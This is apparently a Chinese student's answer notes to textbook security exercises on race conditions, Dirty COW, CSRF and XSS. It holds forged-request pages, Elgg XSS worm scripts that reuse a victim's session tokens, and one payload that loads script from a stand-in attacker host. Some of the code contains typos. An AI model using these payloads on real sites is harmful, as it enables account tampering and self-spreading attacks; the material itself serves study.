+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230203162515899.png" alt="image-20230203162515899"></p>
+<p>只有文件已经打开时，它才会被锁定到其他进程。在检查和打开过程中，不可能锁定文件。恶意进程可以忽略创建的任何锁。</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230203162706284.png" alt="image-20230203162706284"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">&quot;/tmp/XYZ&quot;</span>;</span><br><span class="line">fd = open(filename, O_RDWR);</span><br><span class="line">status = access(filename, W_OK);</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="comment">//... (code omitted) ...</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (status == ACCESS_ALLOWED) &#123;</span><br><span class="line">    write_to_file(fd);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Permission denied\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>？</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230203162907361.png" alt="image-20230203162907361"></p>
+<p>P144</p>
+<h1 id="08-Dirty-COW-ex"><a href="#08-Dirty-COW-ex" class="headerlink" title="08_Dirty_COW_ex"></a>08_Dirty_COW_ex</h1><p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230209105151358.png" alt="image-20230209105151358"></p>
+<p>World</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230209105203498.png" alt="image-20230209105203498"></p>
+<p>当子进程首次写入内存时，将发生内存复制。因为父级和子级有独立的内存空间，所以拷贝发生在写入时，或者我们现在所知道的COW。</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230209105237385.png" alt="image-20230209105237385"></p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230209110258822.png" alt="image-20230209110258822"></p>
+<p>NO，因为是私有模式下的内存映射</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230209110415627.png" alt="image-20230209110415627"></p>
+<p>不，当两个进程将同一个文件映射到内存时，它们将拥有各自的副本。在其中一个上运行madvise，在另一个上写入时不会触发副本，因此它必须是调用write（）和madvise（）的同一进程。</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230209110454801.png" alt="image-20230209110454801"></p>
+<p>&#x2F;etc&#x2F;shadow<br>&#x2F;etc&#x2F;sudoers - 此文件定义可以运行sudo命令的用户列表。一旦用户被添加到sudoers列表中，用户就可以运行</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230209110541090.png" alt="image-20230209110541090"></p>
+<p>否。MAP_PRIVATE导致只读文件映射到只读内存块。我们不能使用memcpy（）对它进行写入，它会抛出一个错误。我们应该改用write（）函数。</p>
+<h1 id="09-Web-CSRF-ex"><a href="#09-Web-CSRF-ex" class="headerlink" title="09_Web_CSRF_ex"></a>09_Web_CSRF_ex</h1><p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230217171900540.png" alt="image-20230217171900540"></p>
+<p>同一个站点cookie有一个由服务器设置的特殊属性SameSite。如果存在此属性，并且其值是严格的，则浏览器将不会将cookie与跨站点请求一起发送。服务器可以检测到cookie的缺失并选择不响应或出错，从而防止攻击。</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230217171947388.png" alt="image-20230217171947388"></p>
+<p>token由服务器提供 隐藏在页面 随着请求一起发送 而恶意网站伪造的请求 没有token 或者token不对</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230217172041794.png" alt="image-20230217172041794"></p>
+<p>HTTPS只是对客户机和服务器之间的通信进行加密，但几乎无法检测信息来自何处，因此即使在HTTPS站点中，CSRF攻击也是可能的。</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230217172104502.png" alt="image-20230217172104502"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>task<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://www.example.com/delete.php?pageid=5&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;image&quot;</span> <span class="attr">width</span>=<span class="string">&quot;1&quot;</span> <span class="attr">height</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230217172323593.png" alt="image-20230217172323593"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span> <span class="title function_">forge_post</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> fieles=<span class="string">&quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;pageid&#x27; value=&#x27;5&#x27;&gt;&quot;</span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> p = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;form&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                p.<span class="property">action</span> = <span class="string">&quot;http://www.example.com/delete.php&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">                p.<span class="property">innerHTML</span> = fields;</span></span><br><span class="line"><span class="language-javascript">                p.<span class="property">method</span> = <span class="string">&quot;post&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(p);</span></span><br><span class="line"><span class="language-javascript">                p.<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="property">onload</span>=<span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            	<span class="title function_">forge_post</span>();</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造form表单，打开网页时发送数据</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230217172521124.png" alt="image-20230217172521124"></p>
+<p>为了得到被攻击者的user id，加boby好友 观察请求报文 分析得到boby的user id</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230217172647211.png" alt="image-20230217172647211"></p>
+<p>不能。不可能读取另一个页面的内容，因此在不知道id的情况下，攻击者无法发送伪造的请求。</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230217172736177.png" alt="image-20230217172736177"></p>
+<p>可以 cookie自动提交（写好脚本先加好友，捕获id，再发送伪造请求）</p>
+<p>可以 请求只要填入alice的id 就行 cookie会自动提交</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230217172912225.png" alt="image-20230217172912225"></p>
+<p>同源策略，不同的源的页面不能读取其他源的cookie内容 同站点才能操作cookie 得到其中的session id 并附加发送</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230217173035703.png" alt="image-20230217173035703"></p>
+<p>浏览器知道请求来自哪个页面，也知道请求发送到哪个站点。通过验证它们不在同一域中，浏览器可以知道这是否是跨站点请求。</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230217173116725.png" alt="image-20230217173116725"></p>
+<p><del>NO</del></p>
+<p>这取决于服务器的编写方式。如果服务器在每个页面中嵌入一个特殊的令牌，并期望该令牌作为请求的一部分，那么令牌的存在或不存在可以告诉服务器请求是同一站点还是跨站点的。</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230217173151654.png" alt="image-20230217173151654"></p>
+<p>因为很多浏览器在向服务器发送请求之前会删除referer头，以尊重用户的隐私。</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230217173239135.png" alt="image-20230217173239135"></p>
+<p>因为跨站点请求可以伪造，而同一个站点请求总是真实的。</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230217173256656.png" alt="image-20230217173256656"></p>
+<p>不能，有很多使用跨站点请求的合法案例。例如，您的facebook.com凭据可用于登录instagram.com。如果浏览器不附加cookie，身份验证将永远无法工作。</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230217173327890.png" alt="image-20230217173327890"></p>
+<p><strong>来自iframe内的请求不被视为跨站点请求。</strong>这可以通过使用X-Frame-Options头来保护。它可以设置为deny, sameorigin, or allow-from。前两个是不言自明的。最后一个选项获取允许在iframe中放置页面的站点列表。</p>
+<h1 id="10-Web-XSS-ex"><a href="#10-Web-XSS-ex" class="headerlink" title="10_Web_XSS_ex"></a>10_Web_XSS_ex</h1><p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230218174210824.png" alt="image-20230218174210824"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> <span class="title class_">Ajax</span>=<span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> sendurl=<span class="string">&quot;http://www.example.com/delete.php?pageid=5&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="title class_">Ajax</span>=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="title class_">Ajax</span>.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,sendurl,<span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="title class_">Ajax</span>.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Host&quot;</span>,<span class="string">&quot;www.example.com&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="title class_">Ajax</span>.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="title class_">Ajax</span>.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230218174437522.png" alt="image-20230218174437522"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> ts=<span class="string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_ts</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> token=<span class="string">&quot;&amp;__elgg_token=&quot;</span>+elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_token</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> content=ts+token+<span class="string">&quot;&amp;pageid=5&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> samyGuid=<span class="number">47</span>; <span class="comment">//FILL IN</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>(elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span>!=samyGuid)</span></span><br><span class="line"><span class="language-javascript">        &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> <span class="title class_">Ajax</span>=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> sendurl=<span class="string">&quot;http://www.example.com/delete.php&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="title class_">Ajax</span>.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,sendurl,<span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="title class_">Ajax</span>.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Host&quot;</span>,<span class="string">&quot;www.example.com&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="title class_">Ajax</span>.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/x-www-formurlencoded&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="title class_">Ajax</span>.<span class="title function_">send</span>(content);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230218174655958.png" alt="image-20230218174655958"></p>
+<p>如果没有该判断，当samy把攻击代码放入他自己的个人主页后，修改过的内容会立刻显示出来，导致主页中的攻击代码立刻得到执行，把samy的主页内容改成“samy is my hero”，原来的攻击代码就被覆盖掉</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230218183704565.png" alt="image-20230218183704565"></p>
+<p>是的。由于XSS攻击的关键是在受害者的浏览器中嵌入恶意javascript代码，因此阻止任何javascript被上传无疑也会阻止任何javascript被下载。（上传不了，别人也就浏览不了）</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230218184220575.png" alt="image-20230218184220575"></p>
+<p>CSRF攻击源于与目标页不同，而XSS攻击源于同一页。XSS攻击还涉及将javascript代码注入页面。</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230218184239284.png" alt="image-20230218184239284"></p>
+<p>不，因为注入的javascript可以做受害者页面通常可以做的任何事情，所以它可以轻松地访问秘密令牌并向服务器发送请求。（get一下）</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230218184321271.png" alt="image-20230218184321271"></p>
+<p>不，XSS攻击发生在同一个站点，所以服务器不会怀疑任何事情。</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230218184640574.png" alt="image-20230218184640574"></p>
+<p>不，脚本标签不是嵌入javascript的唯一方法；HTML标记的许多属性还包括javascript代码。</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230218184823394.png" alt="image-20230218184823394"></p>
+<p>对从页面发送的所有内容进行编码，以确保没有代码传输到服务器。</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230218184904970.png" alt="image-20230218184904970"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    window.onload = function () &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        var userName=elgg.session.user.name;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        var ts=&quot;&amp;__elgg_ts=&quot;+elgg.security.token.__elgg_ts;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        var token=&quot;&amp;__elgg_token=&quot;+elgg.security.token.__elgg_token;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        var sendurl=&quot;http://www.xsslabelgg.com/action/profile/edit&quot;;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        var desc=&quot;<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>been attacked!!!&lt;\/b&gt;&lt;\/p&gt;<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">\</span>&quot;<span class="attr">text</span>\/<span class="attr">javascript</span>\&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml"><span class="language-handlebars">        <span class="attr">src</span>=<span class="string">\</span>&quot;<span class="attr">http:</span>\/\/<span class="attr">www.csrflabattacker.com</span>\/<span class="attr">task6.js</span>\&quot;&gt;</span>&lt;\/script&gt;&quot;;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        var content=&quot;name=&quot;+userName+ts+token+&quot;&amp;description=&quot;+desc;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        var samyGuid=47; //FILL IN</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        if(elgg.session.user.guid!=samyGuid) &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            var Ajax=new XMLHttpRequest();</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            var sendurl=&quot;http://www.xsslabelgg.com/action/profile/edit&quot;;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            Ajax.open(&quot;POST&quot;,sendurl,true);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            Ajax.setRequestHeader(&quot;Host&quot;,&quot;www.xsslabelgg.com&quot;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            Ajax.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-formurlencoded&quot;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            Ajax.send(content);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        &#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    &#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230218185742815.png" alt="image-20230218185742815"></p>
+<p>将代码与数据混合对安全性有害案例：</p>
+<p>格式字符串漏洞及利用。<br>缓冲区溢出攻击。<br>shell-shock攻击。<br>SQL注入攻击。</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230218185826096.png" alt="image-20230218185826096"></p>
+<p>告诉浏览器那些来源是可以信任的</p>
